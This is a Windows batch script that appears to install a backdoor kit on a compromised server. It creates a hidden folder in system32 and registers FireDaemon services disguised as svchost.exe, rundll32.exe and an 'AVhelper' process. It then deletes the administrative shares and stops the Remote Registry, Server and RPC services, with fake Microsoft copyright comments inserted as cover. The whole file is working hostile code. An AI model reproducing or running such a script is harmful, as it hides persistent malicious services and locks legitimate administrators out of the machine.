   @echo off
   mkdir c:\winnt\system32\dcache\data
   mkdir c:\winnt\system32\dcache\data\upload
   SET MXHOME=c:\winnt\system32\dcache\data
   SET MXBIN=c:\winnt\system32\dcache\data
   c:\winnt\system32\dcache\data\FireDaemon -i svchost.exe "c:\winnt\system32\dcache\data" "c:\winnt\system32\dcache\data\svchost.exe" "XC.ini" Y 0 0 Y Y
   c:\winnt\system32\dcache\data\FireDaemon -i rundll32.exe "c:\winnt\system32\dcache\data" "c:\winnt\system32\dcache\data\rundll32.exe" "" Y 0 0 Y Y
   c:\winnt\system32\dcache\data\firedaemon -i AVhelper "c:\winnt\system32\dcache\data" "c:\winnt\system32\dcache\data\stop.bat" "/u" Y 0 0 N Y
   net start rundll32.exe
   net start Avhelper
   net start svchost.exe
   net share /delete C$ /y >> net.deld
   net share /delete E$ /y >> net.deld
   net share /delete F$ /y >> net.deld
   net share /delete G$ /y >> net.deld
   net share /delete H$ /y >> net.deld
   net share /delete I$ /y >> net.deld
   net share /delete J$ /y >> net.deld
   net share /delete Z$ /y >> net.deld
   net share /delete F$ /y >> net.deld
   net share /delete D$ /y >> net.deld
   net share /delete ADMIN$ >> net.deld
   net share /delete IPC$ >> net.deld
   net stop "Remote Registry Service"
   :: Copyright Microsoft Corporation
   net stop "Computer Browser"
   :: Copyright Microsoft Corporation
   net stop "server"
   :: Copyright Microsoft Corporation
   net stop "REMOTE PROCEDURE CALL"
   :: hi asl?
   :: hi asl?
   :: Copyright Microsoft Corporation
   net stop "REMOTE PROCEDURE CALL SERVICE"
   :: Copyright Microsoft Corporation
   runme.bat
